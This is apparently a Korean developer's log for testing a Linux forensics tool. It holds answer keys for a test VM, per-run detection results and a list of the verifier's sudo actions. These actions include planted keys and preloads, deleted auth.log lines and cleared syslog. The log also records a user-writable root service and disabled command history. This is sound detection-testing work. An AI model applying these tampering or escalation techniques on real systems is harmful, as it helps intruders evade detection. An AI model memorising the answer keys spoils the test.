## 2-D 파일·명령 기록·설정 정답 (2026-11-06, `original`)

- 임시 폴더 ELF 없음, immutable·append-only 없음, 명령 기록 파일 없음, 웹 서버 없음(/var/www·nginx·apache 로그 없음)
- capability: /usr/bin/mtr-packet cap_net_raw+ep (패키지)
- 시스템 영역 숨김 폴더: /tmp의 X 폴더 5개(.ICE-unix·.XIM-unix·.X11-unix·.font-unix·.Test-unix), /lib/modules/*/vdso/.build-id, /usr/src/linux-headers-*/.tmp_versions
- /etc/hosts 기본(localhost.localdomain 형식), resolv.conf → resolved 스텁, resolved.conf 기본
- iptables: Docker 체인(DOCKER·DOCKER-USER·DOCKER-ISOLATION-STAGE-1·2)과 docker0 대역 MASQUERADE뿐, DNAT·REDIRECT 없음. nft 미설치, /etc/iptables·nftables.conf 없음, ufw inactive


## 22차 적용 — 2-D (`1209bf1`, 코드 해시 181f866a…, 2026-11-09)

복사 절차 6번(NUL 검사 0개) 포함. 기준선(`original`): 탐지 14건 — 2-C 때와 같음(권한 상승 경로 8 / 8), **2-D 11개 항목 탐지 없음**
- FS-03: capability 1개(패키지 원본 mtr-packet) 정상
- FS-08: 숨김 폴더 9개 모두 정상 (/tmp X 폴더, vdso/.build-id, linux-headers/.tmp_versions)
- FS-09: 핵심 위치 2,295개, 속성을 지원하지 않는 파일시스템 1개(tmpfs로 보임)
- NET-03 hosts 7개 항목 정상, NET-04 resolved 스텁, NET-05 iptables Docker 규칙만(15줄) — nft 미설치라 iptables만
- CMD 명령 기록 0개, 웹 로그 0개 — 정답과 일치
이후 `original` 복원


## 2-E 로그 계열 정답 (2026-11-09, `original`)

- wtmp 1,920바이트 — 이번 부팅(05:14:49)부터 시작, btmp 0바이트, lastlog 292,292바이트(UID 크기만큼 희소 파일). 인증 로그도 같은 시점부터라 기록끼리 어긋나지 않음 (배포 전 /var/log를 비운 영향)
- 명령 기록 파일 없음 (/etc/profile의 `unset HISTFILE` — PER-04)
- rsyslog·journald active, journald.conf 기본, /var/log/journal 없음 → 메모리 전용 journal(18.04 기본값), 부팅 1개만 남음(4.9MB)
- 커널 err 이상 기록 없음
- 이번 부팅(약 5분) 안 최대 기록 간격 2.6초, 1분 넘게 거꾸로 간 기록 0, 미래 시각 파일 없음
- 정답 명령 주의: 18.04 journalctl은 `-- Logs begin at …` 머리말을 찍어 awk가 0으로 읽음 — 숫자로 시작하는 줄만 세야 함

## 검증자 활동 (auth.log에 남는 기록)

탐지 결과와 섞이지 않도록 따로 적는다.

1. `sudo python3 -m lintrace` — 거부 (2회)
2. `sudo -l` — 1회
3. `sudo /bin/bash -c 'cd /home/bob/lintrace && python3 -m lintrace'` — 5회 (1차 1회, 2차 2회, 3차 2회 — 3차 중 1회는 이전 버전)
4. `sudo /bin/bash -c` 로 정답 자료 확인 — `find`(authorized_keys), `ls`/`grep`(sshd 설정), `cat`(crontab, cron.d), `ls`/`cat`(cron.* 폴더, backup)
5. `sudo /bin/bash` 대화형 셸 1회 — 4차 적용(키 심기, `ssh-keygen`, 도구 실행). 이후 스냅샷 복원
6. 5차 적용 도구 실행 1회, PER-05 정답 확인 `ls`/`cat` 1회
7. 6차 적용 도구 실행 1회, 7차 적용 `sudo /bin/bash` 대화형 셸 1회(preload 작성·도구 실행·삭제). 이후 스냅샷 복원
8. (2026-11-03, 스냅샷 복원 후) PRC-01 정답 확인 `ls -l /proc/*/exe` 1회
9. 9차 적용 `sudo /bin/bash` 대화형 셸 2겹 (`sleep` 복사·실행·삭제, 도구 실행, `kill`). 이후 스냅샷 복원
10. PRC-03 정답 확인 `ls -l /proc/*/exe`, `ps` 1회
11. 11차 적용 `sudo /bin/bash` 대화형 셸 1회 (테스트 프로세스 3개 실행·도구 실행·종료). 이후 스냅샷 복원
12. FS-02 정답 확인 `find`·`dpkg -S` 1회
13. 12차 적용 도구 실행 1회
14. FS-06 정답 확인 `ls /var/www`, nginx·apache2·php 설치 여부 1회
15. 13차 적용 도구 실행 1회
16. 14차 적용 `sudo /bin/bash` 대화형 셸 1회 (`/var/www/html`에 파일 5개 작성·도구 실행). 이후 스냅샷 복원
17. LOG-01 정답 확인 `sudo /bin/bash` 대화형 셸 1회 (`ls`, `find /proc/*/fd`, `head`)
18. 15차 적용 도구 실행 1회, 16차 적용 `sudo /bin/bash` 셸 1회 (auth.log 줄 삭제, rsyslog 재시작, syslog 비우기, kern.log 삭제, 도구 2회). 이후 스냅샷 복원
19. 17차 적용 `sudo /bin/bash` 셸 1회 (도구 2회, `sha256sum -c`, auth.log 줄 삭제, `grep`). 이후 스냅샷 복원
20. 2-A 정답 확인 `sudo /bin/bash` 셸 1회 (`/etc/passwd`·`shadow`·`group`, auth.log, sshd 설정, `/etc/pam.d`, `dpkg -S`·`--verify`)
21. 18차 적용 도구 실행 1회 (`sudo /bin/bash -c`)
22. 2-B 정답 확인 `sudo /bin/bash` 셸 1회 (`ss`, `/proc/*/exe·cmdline·environ·fd`, `ps`, `/sys/class/net`)
23. 19차 적용 `sudo /bin/bash` 셸 1회 (도구 2회, nc·sleep·tcpdump 실행). 이후 스냅샷 복원
24. NFS 정답 확인 (bob, `/proc/fs/nfsd/portlist`, `nlm_*port`, `rpcinfo`, `ss`)
25. 20차 적용 `sudo /bin/bash` 셸 1회 (도구 2회, nc·bash·python 실행). 이후 스냅샷 복원

## 2-C 지속성·패키지 무결성 정답 (2026-11-06, `original`)

- `dpkg --verify` 15줄, 모두 설정 파일(c): update-motd.d 13개, /etc/sudoers, /etc/crontab, /etc/hosts.equiv, /etc/sysctl.d/10-ipv6-privacy.conf. update-motd.d는 00-header만 내용이 바뀌었고(끝에 `printf "\n$(cat /etc/update-motd.d/logo)\n"`와 환영 문구) 나머지 12개와 hosts.equiv는 **삭제**됨 — dpkg는 없는 설정 파일도 `??5`로 표시
- 지속성 위치의 패키지 밖 파일: snap-core-4486·4917.mount(실행 지시어 없음, `What=/var/lib/snapd/snaps/…`), /etc/udev/rules.d/70-snap.core.rules(RUN 0개), /etc/update-motd.d/logo(실행 권한 없음 — run-parts가 건너뜀, 내용은 ASCII 그림), **/lib/systemd/system/debug.service**
- **debug.service**: 소유자 peter(일반 사용자)·`-rw-r--r--`, `User=root`, `ExecStart=/root/debug`, `Restart=always`, enabled — peter가 유닛을 고쳐 root로 명령을 실행할 수 있는 권한 상승 경로 (8번째)
- /etc/profile: `/usr/share/base-files/profile`과 비교해 `unset HISTFILE` 한 줄 추가 (모든 사용자 명령 기록 끔). /etc/profile은 dpkg 설정 파일이 아니라 `dpkg --verify`로는 안 보임
- 시스템 경로의 패키지 밖 파일: 대체 링크(/etc/alternatives)와 dpkg diversion(/bin/sh.distrib — dash, /usr/sbin/grub-set-default.real — grub-legacy-ec2)뿐. /usr/local 비어 있음
- at 설치됨, 대기 작업 없음 (/var/spool/cron/atjobs에 .SEQ만). /etc/rc.local 없음
- 커널 4.15.0-23, tainted 9216 = C(staging)+E(서명 없음) — /sys/module/vboxvideo/taint `CE`, 커널 트리 안 모듈. /proc/modules 88개 = /sys/module initstate 88개. 트리 밖 모듈·modprobe `install` 줄 없음
- PAM: sshd·login 모두 pam_motd 사용 (로그인 때 update-motd.d 실행)
- 정답 명령 주의: /lib→/usr/lib로 맞춘 경로가 출력돼 debug.service가 /usr/lib에 있는 것처럼 보였음 (usrmerge 없는 시스템)
